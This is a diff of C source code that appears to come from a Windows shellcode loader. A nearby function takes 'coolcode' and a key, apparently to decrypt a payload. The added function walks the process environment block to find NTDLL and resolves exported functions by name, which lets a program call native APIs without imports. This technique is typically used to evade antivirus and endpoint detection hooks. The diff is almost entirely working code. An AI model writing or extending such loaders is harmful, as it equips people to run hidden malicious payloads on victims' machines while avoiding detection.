@@ -56,6 +56,69 @@ void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
 
 }
 
+typedef void* (*cool)(void*, size_t);
+
+typedef struct _TEB {
+    PVOID Reserved1[12];
+    PPEB ProcessEnvironmentBlock;
+} TEB, *PTEB;
+
+cool Getaddress(const char *vv) {
+#ifdef _M_X64
+    PPEB peb = (PPEB)__readgsqword(0x60);
+#else
+    PPEB peb = (PPEB)__readfsdword(0x30);
+#endif
+
+    PTEB teb;
+#ifdef _M_X64
+    teb = (PTEB)__readgsqword(0x30);
+#else
+    teb = (PTEB)__readfsdword(0x18);
+#endif
+
+    peb = teb->ProcessEnvironmentBlock;
+    PPEB_LDR_DATA ldr = peb->Ldr;
+    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
+    LIST_ENTRY* entry = moduleList->Flink;
+
+    while (entry != moduleList) {
+        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
+        entry = entry->Flink;
+
+        if (!module->BaseDllName.Buffer) continue;
+        
+        wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
+        
+        if (_wcsicmp(module->BaseDllName.Buffer, L"NTDLL.DLL") == 0) {
+            BYTE* baseAddress = (BYTE*)module->DllBase;
+            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
+            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
+            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+            
+            if (exportDir.VirtualAddress == 0) return NULL;
+            
+            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
+            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
+            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
+            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
+            
+            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
+                char* functionName = (char*)(baseAddress + nameArray[i]);
+                printf("Exported Function: %s\n", functionName);
+                
+                if (strcmp(functionName, vv) == 0) {
+                    DWORD funcRVA = funcArray[ordinalArray[i]];
+                    void* funadd = (void*)(baseAddress + funcRVA);
+                    printf("%s found at address: %p\n", vv, funadd);
+                    return (cool)funadd;
+                }
+            }
+        }
+    }
+    return NULL;
+}
+
 
 
 int main(int argc, char* argv[]) {
